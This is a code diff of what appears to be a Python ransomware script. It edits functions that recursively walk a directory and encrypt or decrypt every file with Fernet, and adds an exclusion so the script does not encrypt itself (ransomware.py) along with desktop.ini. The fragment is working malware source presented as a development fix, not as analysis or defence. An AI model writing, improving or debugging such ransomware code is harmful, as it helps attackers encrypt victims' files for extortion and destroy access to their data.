@@ -31,7 +31,8 @@ def encrypt_directory(directory, key):
         f = Fernet(key)
         for root, _, files in os.walk(directory):
             for file in files:
-                if file.lower() == "desktop.ini":  # Skip desktop.ini
+                # Skip desktop.ini and ransomware.py
+                if file.lower() in ["desktop.ini", "ransomware.py"]:
                     continue
                 filepath = os.path.join(root, file)
                 with open(filepath, "rb") as file_obj:
@@ -48,7 +49,8 @@ def decrypt_directory(directory, key):
         f = Fernet(key)
         for root, _, files in os.walk(directory):
             for file in files:
-                if file.lower() == "desktop.ini":  # Skip desktop.ini
+                # Skip desktop.ini and ransomware.py
+                if file.lower() in ["desktop.ini", "ransomware.py"]:
                     continue
                 filepath = os.path.join(root, file)
                 with open(filepath, "rb") as file_obj:
